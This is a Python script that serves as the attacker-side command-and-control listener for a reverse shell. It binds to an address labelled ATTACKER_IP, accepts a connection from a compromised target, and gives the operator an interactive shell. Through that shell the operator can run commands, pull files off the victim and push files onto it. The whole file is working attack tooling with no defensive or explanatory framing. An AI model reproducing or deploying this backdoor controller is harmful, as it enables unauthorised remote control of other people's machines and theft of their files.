import socket
import json
import os

ATTACKER_IP = '10.0.45.15'
ATTACKER_PORT = 5555
DATA_LENGTH = 1024 # bytes

def reliable_send(target, command):
    jsondata = json.dumps(command)
    target.send(jsondata.encode())

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(DATA_LENGTH).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        
def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(DATA_LENGTH)
    
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(DATA_LENGTH)
        except socket.timeout as e:
            break

    target.settimeout(None)
    f.close()

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())
    
def target_communication(target, ip):
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        else:
            result = reliable_recv(target)
            print(result)

# AF_INET: Connection will be established using IPv4.
# SOCK_STREAM: We're going to use TCP protocol.
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ATTACKER_IP, ATTACKER_PORT))
print('[+] Listening For Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

target_communication(target, ip)
